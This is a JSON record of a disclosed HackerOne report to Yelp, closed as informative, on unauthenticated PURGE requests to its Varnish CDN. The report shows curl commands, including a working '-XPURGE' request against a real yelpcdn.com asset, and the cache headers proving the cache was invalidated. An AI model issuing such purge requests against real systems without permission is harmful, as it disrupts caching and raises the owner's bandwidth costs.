@@ -1,0 +1,282 @@
+{
+    "id": 629612,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82Mjk2MTI=",
+    "url": "https://hackerone.com/reports/629612",
+    "title": "PURGE is not authenticated",
+    "state": "Closed",
+    "substate": "informative",
+    "severity_rating": "low",
+    "readable_substate": "Informative",
+    "created_at": "2019-06-26T01:29:34.709Z",
+    "submitted_at": "2019-06-26T01:29:34.709Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "rac_fckscty",
+        "url": "/rac_fckscty",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/fqp7leprf2f74cj2tlzyip2yk4xu/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": true,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 545,
+        "url": "https://hackerone.com/yelp",
+        "handle": "yelp",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Yelp",
+            "twitter_handle": "",
+            "website": "https://www.yelp.com",
+            "about": "Connecting people to great local businesses in communities around the world."
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2023-01-19T18:07:20.090Z",
+    "bug_reporter_agreed_on_going_public_at": null,
+    "team_member_agreed_on_going_public_at": "2022-10-07T17:10:19.720Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "Hi @yelp Team,\n\nAnyone can issue a PURGE request for any resource and invalidate your caches. That can lead to increased bandwidth costs.\n\nFetching the resource headers, we can see in the `X-Cache-Hits: 1, 14` :\n```\nE:\\>curl https://s3-media0.fl.yelpcdn.com/assets/public/pride@2x.yelp_design_web.yji-629fce3629585b9db2137d9353196628.png --head\nHTTP/1.1 200 OK\nETag: \"629fce3629585b9db2137d9353196628\"\nx-amz-version-id: KnfcY6QenKubeC6DBXpUT1d87B17ORdD\nContent-Type: image/png\nServer: AmazonS3\nVia: 1.1 varnish\nAccess-Control-Allow-Origin: *\nContent-Length: 17079\nAccept-Ranges: bytes\nDate: Wed, 26 Jun 2019 01:22:10 GMT\nVia: 1.1 varnish\nConnection: keep-alive\nX-Served-By: cache-sjc3141-SJC, cache-hkg17922-HKG\nX-Cache: HIT, HIT\nX-Cache-Hits: 1, 14\nX-Timer: S1561512131.889727,VS0,VE0\nCache-Control: max-age=315360000, immutable\nTiming-Allow-Origin: *\nX-Content-Type-Options: nosniff\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\n```\n\nUnauthenticated purge request:\n```\nE:\\>curl https://s3-media0.fl.yelpcdn.com/assets/public/pride@2x.yelp_design_web.yji-629fce3629585b9db2137d9353196628.png --head -XPURGE\nHTTP/1.1 200 OK\nContent-Type: application/json\nContent-Length: 46\nAccept-Ranges: bytes\nDate: Wed, 26 Jun 2019 01:22:17 GMT\nX-Varnish: 1668603163\nVia: 1.1 varnish\nConnection: keep-alive\nX-Served-By: cache-hkg17923-HKG\n```\n\nHeader `X-Cache-Hits: 1, 0`:\n```\nE:\\>curl https://s3-media0.fl.yelpcdn.com/assets/public/pride@2x.yelp_design_web.yji-629fce3629585b9db2137d9353196628.png --head\nHTTP/1.1 200 OK\nETag: \"629fce3629585b9db2137d9353196628\"\nx-amz-version-id: 8qpzJuX00EuyeMTUm5QGEHehZ2rbfRmQ\nContent-Type: image/png\nServer: AmazonS3\nVia: 1.1 varnish\nAccess-Control-Allow-Origin: *\nContent-Length: 17079\nAccept-Ranges: bytes\nDate: Wed, 26 Jun 2019 01:22:20 GMT\nVia: 1.1 varnish\nConnection: keep-alive\nX-Served-By: cache-sjc3129-SJC, cache-hkg17923-HKG\nX-Cache: HIT, MISS\nX-Cache-Hits: 1, 0\nX-Timer: S1561512140.209567,VS0,VE151\nCache-Control: max-age=315360000, immutable\nTiming-Allow-Origin: *\nX-Content-Type-Options: nosniff\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\n```\n\n## Impact\n\nThat can lead to increased bandwidth costs.",
+    "weakness": {
+        "id": 27,
+        "name": "Improper Authentication - Generic"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [],
+    "allow_singular_disclosure_at": null,
+    "vote_count": 8,
+    "voters": [
+        "0utlawh4ck3r",
+        "zy9ard3",
+        "shubham_srt",
+        "kerolesmagdy",
+        "safu21",
+        "finho",
+        "ymy0x01",
+        "meispi"
+    ],
+    "severity": {
+        "rating": "low",
+        "author_type": "Team"
+    },
+    "structured_scope": null,
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 5195849,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi there!\n\nThanks for submitting your report to us! Please expect a response within a week.\n\nBest,\nThe Yelp Security Team\n",
+            "automated_response": true,
+            "created_at": "2019-06-26T01:29:35.063Z",
+            "updated_at": "2019-06-26T01:29:35.063Z",
+            "actor": {
+                "url": "/yelp",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Yelp"
+                }
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 5201110,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "Hi there!\n\nThanks for submitting your report to us!\n\nWe are investigating the reported issue and will update this thread once we have further details.\n\nBest,\nThe Yelp Security Team",
+            "automated_response": false,
+            "created_at": "2019-06-26T17:58:44.359Z",
+            "updated_at": "2019-06-26T17:58:44.359Z",
+            "actor": {
+                "username": "vzhou",
+                "cleared": false,
+                "verified": false,
+                "url": "/vzhou",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 5208692,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportSeverityUpdated",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2019-06-27T18:33:43.850Z",
+            "updated_at": "2019-06-27T18:33:43.850Z",
+            "additional_data": {
+                "old_severity": "Medium",
+                "new_severity": "Low",
+                "old_severity_id": 444253,
+                "new_severity_id": 445684
+            },
+            "actor": {
+                "username": "vzhou",
+                "cleared": false,
+                "verified": false,
+                "url": "/vzhou",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 5209782,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugInformative",
+            "message": "Thank you for helping us protect the Yelps. Keeping our users, our data, and our sites safe is really important to us. \n\nWe have closed this report as informative because the issue was already known and documented internally. In addition, we determined the monetary risk from the lack of authentication to be low.\n\nPlease keep banging away on the Yelps, we'd love to see what else you find.",
+            "automated_response": false,
+            "created_at": "2019-06-27T20:31:31.084Z",
+            "updated_at": "2019-06-27T20:31:31.084Z",
+            "actor": {
+                "username": "vzhou",
+                "cleared": false,
+                "verified": false,
+                "url": "/vzhou",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 18688006,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-10-07T17:10:19.772Z",
+            "updated_at": "2022-10-07T17:10:19.772Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "lorenzo-yelp",
+                "cleared": false,
+                "verified": false,
+                "url": "/lorenzo-yelp",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 18830704,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Is there an update for this? Thanks",
+            "automated_response": false,
+            "created_at": "2022-10-18T07:12:22.073Z",
+            "updated_at": "2022-10-18T07:12:22.073Z",
+            "actor": {
+                "username": "rac_fckscty",
+                "cleared": false,
+                "verified": true,
+                "url": "/rac_fckscty",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/fqp7leprf2f74cj2tlzyip2yk4xu/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 19999382,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ManuallyDisclosed",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2023-01-19T18:07:19.918Z",
+            "updated_at": "2023-01-19T18:07:19.918Z",
+            "actor": {
+                "username": "lorenzo-yelp",
+                "cleared": false,
+                "verified": false,
+                "url": "/lorenzo-yelp",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
